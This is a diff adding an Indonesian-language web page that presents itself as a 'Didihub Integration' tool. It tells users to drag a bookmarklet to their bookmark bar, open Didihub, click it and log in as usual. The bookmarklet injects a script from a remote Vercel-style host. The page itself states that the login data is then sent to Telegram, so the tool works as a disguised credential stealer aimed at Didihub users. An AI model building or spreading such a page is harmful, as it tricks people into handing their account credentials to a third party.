@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Didihub Integration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e2029;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #282a36;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #f1c40f;
+            margin-bottom: 20px;
+        }
+
+        a {
+            color: #f1c40f;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .bookmarklet {
+            display: inline-block;
+            background-color: #f1c40f;
+            color: #282a36;
+            padding: 10px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .instructions {
+            background-color: #34373d;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .instructions ol {
+            margin-left: 20px;
+            line-height: 1.6;
+        }
+
+        .note {
+            background-color: #e74c3c;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Didihub Integration</h1>
+        
+        <p>Gunakan bookmarklet ini untuk mengaktifkan integrasi Telegram pada situs Didihub.</p>
+        
+        <div class="instructions">
+            <h2>Cara Penggunaan:</h2>
+            <ol>
+                <li>Drag dan drop tombol di bawah ini ke bookmark bar browser Anda</li>
+                <li>Kunjungi situs <a href="https://www.didihub.com" target="_blank">Didihub</a></li>
+                <li>Klik bookmark yang baru saja Anda tambahkan</li>
+                <li>Login seperti biasa</li>
+                <li>Data login akan dikirim ke Telegram dan tab baru akan terbuka ke halaman Hilo</li>
+            </ol>
+        </div>
+        
+        <p>Drag tombol ini ke bookmark bar Anda:</p>
+        <a href="javascript:(function(){var script=document.createElement('script');script.src='https://NAMA-PROYEK-ANDA.vercel.app/public/didihub-integration.js';script.onload=function(){console.log('Didihub Integration Script berhasil dimuat');};script.onerror=function(){console.error('Gagal memuat Didihub Integration Script');};document.head.appendChild(script);})();" class="bookmarklet">Didihub Integration</a>
+        
+        <div class="note">
+            <p><strong>Catatan:</strong> Jika bookmark bar tidak terlihat, tekan Ctrl+Shift+B (Windows/Linux) atau Command+Shift+B (Mac) untuk menampilkannya.</p>
+        </div>
+    </div>
+    
+    <script>
+        // Dapatkan URL saat ini
+        const currentUrl = window.location.href;
+        // Ekstrak domain dan protokol
+        const urlParts = currentUrl.split('/');
+        const baseUrl = urlParts[0] + '//' + urlParts[2];
+        
+        // Perbarui href bookmarklet dengan URL yang benar
+        const bookmarklet = document.querySelector('.bookmarklet');
+        const bookmarkletCode = bookmarklet.getAttribute('href');
+        const updatedCode = bookmarkletCode.replace('https://NAMA-PROYEK-ANDA.vercel.app', baseUrl);
+        bookmarklet.setAttribute('href', updatedCode);
+    </script>
+</body>
+</html>
